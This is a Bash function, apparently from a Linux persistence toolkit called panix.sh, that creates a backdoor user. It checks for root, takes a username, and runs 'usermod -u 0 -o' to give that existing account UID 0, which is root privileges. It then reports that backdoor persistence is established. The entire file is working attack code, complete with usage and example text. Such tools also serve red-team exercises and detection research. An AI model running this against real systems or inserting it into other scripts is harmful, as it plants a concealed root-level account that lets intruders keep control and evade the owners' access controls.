setup_backdoor_user() {
	local username=""

	usage_backdoor_user() {
		echo "Usage: ./panix.sh --backdoor-user [OPTIONS]"
		echo "--examples                 Display command examples"
		echo "--username <username>      Specify the username"
	}

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	while [[ "$1" != "" ]]; do
		case $1 in
			--username )
				shift
				username=$1
				;;
			--examples )
				echo "Examples:"
				echo "sudo ./panix.sh --backdoor-user --username <username>"
				exit 0
				;;
			--help|-h)
				usage_backdoor_user
				exit 0
				;;
			* )
				echo "Invalid option for --backdoor-user: $1"
				echo "Try './panix.sh --backdoor-user --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $username ]]; then
		echo "Error: --username must be specified."
		echo "Try './panix.sh --backdoor-user --help' for more information."
		exit 1
	fi

	usermod -u 0 -o $username

	if [[ $? -eq 0 ]]; then
		echo "[+] User $username has been modified to have UID 0 (root privileges)."
	else
		echo "[-] Failed to modify user $username."
		exit 1
	fi
	echo "[+] Backdoor user persistence established!"
}
